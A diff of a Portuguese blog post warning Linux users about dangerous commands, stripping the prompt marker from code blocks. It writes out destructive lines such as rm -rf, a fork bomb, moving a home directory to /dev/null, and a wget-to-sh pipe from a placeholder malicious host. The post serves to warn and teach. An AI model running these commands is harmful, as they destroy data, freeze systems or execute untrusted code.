@@ -23,7 +23,7 @@ A linha de comando no GNU/Linux é muito produtiva, útil e interessante, no ent
 O comando rm -rf é um dos maneira mais rápida de eliminar uma pasta e seu conteúdo. Mas um pouco de erro de digitação ou ignorância pode resultar em danos no sistema irrecuperáveis. Algumas das opções usadas com o comando rm é: 
 
 {% highlight bash %}
-# rm -rf
+rm -rf
 {% endhighlight %}
 
 comando rm no Linux é usado para apagar arquivos.
@@ -39,7 +39,7 @@ Por isso, tenha cuidado quando você está executando o comando rm -rf. Para evi
 2. :(){:|:&};:
 
 {% highlight bash %}
-# :(){:|:&};:
+:(){:|:&};:
 {% endhighlight %}
 
 A descrição acima é o fork bomb. Ele opera através da definição de uma função chamada ':', que se chama duas vezes, uma no primeiro plano e uma vez no fundo. Ele mantém em execução novamente e novamente até que o sistema congela.
@@ -55,7 +55,7 @@ O comando acima escreve a saída do 'comando' no bloco /dev/sda. O comando acima
 Tudo movido para /dev/null, desaparece do sistema.
 
 {% highlight bash %}
-# mv /home/user/* /dev/null
+mv /home/user/* /dev/null
 {% endhighlight %}
 
 5. wget http://malicious_source -O- | sh
